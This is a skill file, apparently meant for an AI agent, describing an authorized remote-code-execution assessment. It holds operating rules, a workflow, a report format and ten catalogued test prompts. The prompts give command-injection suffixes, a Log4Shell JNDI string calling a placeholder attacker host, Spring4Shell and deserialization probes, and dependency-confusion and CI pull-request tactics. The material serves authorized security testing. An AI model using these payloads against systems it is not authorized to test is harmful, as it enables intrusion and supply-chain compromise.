---
name: claude-rce-security-skill
description: Assess paths where attacker-controlled input can cause unintended operating-system or runtime code execution.
---

# RCE security assessment

Assess paths where attacker-controlled input can cause unintended operating-system or runtime code execution.

## Operating rules

- Work only against systems, applications, accounts, and repositories where explicit authorization and a defined test window exist.
- Prefer local fixtures, staging environments, synthetic records, and non-destructive canaries. Do not access, alter, exfiltrate, or persist real user data.
- Establish rate, concurrency, payload-size, and stop limits before testing. Stop immediately if availability, confidentiality, or integrity could be affected.
- Treat a suspected issue as unconfirmed until the request, response, execution/data-flow evidence, affected principal, and security impact are recorded.
- Never use weaponized payloads when a harmless marker or controlled callback can demonstrate the same behavior.
- Redact secrets and personal data in notes. Report remediation guidance and the exact authorization scope alongside findings.

## Assessment workflow

1. Define scope, identities, environment, test limits, and rollback contacts.
2. Inventory relevant endpoints, inputs, parsers, trust boundaries, and user roles.
3. Start with passive inspection and benign markers; compare behavior across roles, methods, encodings, and content types.
4. Use the category prompt catalog below as hypotheses, adapting payloads to safe canaries and the approved environment.
5. Capture reproducible evidence: timestamp, endpoint, method, sanitized request/response, actor, preconditions, observed result, and impact.
6. Validate fixes with regression tests, then document residual risk and monitoring recommendations.

## Finding format

- **Title / severity / confidence**
- **Affected asset and authorization context**
- **Preconditions and reproduction steps**
- **Sanitized evidence and source-to-sink or control-flow path**
- **Security impact and affected users/data**
- **Root cause**
- **Recommended remediation and regression test**

## Category-specific focus

Use the prompts below to guide a focused **RCE** review. Translate each hypothesis into a safe, authorized test and preserve the evidence needed to reproduce or remediate it.

## Prompt catalog

### 108. Command injection via input

- **Difficulty:** MED
- **Slug:** `command-injection-via-input`
- **Source prompt:** For every input that might reach a shell (filenames, ping/lookup tools, image processing), append `; id`, `| id`, `\`id\``, `$(id)`, `%0aid`. Report any command output.

### 109. ImageMagick / Ghostscript exploit

- **Difficulty:** HARD
- **Slug:** `imagemagick-ghostscript-exploit`
- **Source prompt:** Upload a crafted MVG/SVG/EPS file exploiting known IM/GS RCEs. Test target's image processing pipeline.

### 110. Log4Shell-style template injection

- **Difficulty:** HARD
- **Slug:** `log4shell-style-template-injection`
- **Source prompt:** Submit `${jndi:ldap://attacker/x}` and `${env:PATH}` in every input — User-Agent, headers, form fields. Listen for DNS/LDAP callbacks.

### 111. Spring4Shell / class.module RCE

- **Difficulty:** HARD
- **Slug:** `spring4shell-class-module-rce`
- **Source prompt:** If app is Spring, test for `class.module.classLoader.*` parameter injection.

### 112. Deserialization gadget chain

- **Difficulty:** HARD
- **Slug:** `deserialization-gadget-chain`
- **Source prompt:** Submit known ysoserial gadgets to endpoints accepting serialized Java/PHP/.NET objects.

### 113. Eval-based RCE in admin tools

- **Difficulty:** HARD
- **Slug:** `eval-based-rce-in-admin-tools`
- **Source prompt:** Look for `eval(`, `exec(`, `Function(`, `pickle.loads(`, `yaml.load(` in client-exposed code paths. Test for injection.

### 114. RCE via dependency confusion

- **Difficulty:** HARD
- **Slug:** `rce-via-dependency-confusion`
- **Source prompt:** Check if internal package names are published to public registries. If not, publish a stub and watch for installs.

### 115. RCE via CI/CD on PR

- **Difficulty:** HARD
- **Slug:** `rce-via-ci-cd-on-pr`
- **Source prompt:** If the project has a public CI, push a PR modifying `.github/workflows` or build scripts. Test if it runs on `pull_request` with secrets.

### 116. RCE via SSTI

- **Difficulty:** HARD
- **Slug:** `rce-via-ssti`
- **Source prompt:** See SSTI prompts — many SSTI gadgets lead to direct RCE.

### 117. RCE via XSLT injection

- **Difficulty:** HARD
- **Slug:** `rce-via-xslt-injection`
- **Source prompt:** If app does XSLT transforms on user input, test `xsl:value-of select="system-property('xsl:vendor')"` and document() exploits.

## Source attribution

- Source: [https://hackwithclaude.com/prompts](https://hackwithclaude.com/prompts)
- Retrieved: 2026-08-28
- Included prompts: 10
